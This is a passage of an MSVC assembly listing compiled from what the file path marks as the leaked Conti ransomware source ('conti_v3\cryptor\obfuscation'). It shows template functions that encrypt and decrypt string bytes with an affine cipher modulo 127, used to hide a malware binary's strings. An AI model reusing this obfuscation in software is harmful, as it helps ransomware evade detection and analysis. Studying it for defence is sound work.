  00003	b9 15 00 00 00	 mov	 ecx, 21
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 15	 add	 r8d, 21
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 28 00 00 00	 mov	 ecx, 40			; 00000028H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 28	 add	 r8d, 40			; 00000028H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 03 00 00 00	 mov	 ecx, 3
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 78	 sub	 eax, 120		; 00000078H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 78	 add	 r8d, 120		; 00000078H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 61	 sub	 eax, 97			; 00000061H
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 61	 add	 r8d, 97			; 00000061H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 12	 sub	 eax, 18
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 12	 add	 r8d, 18
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
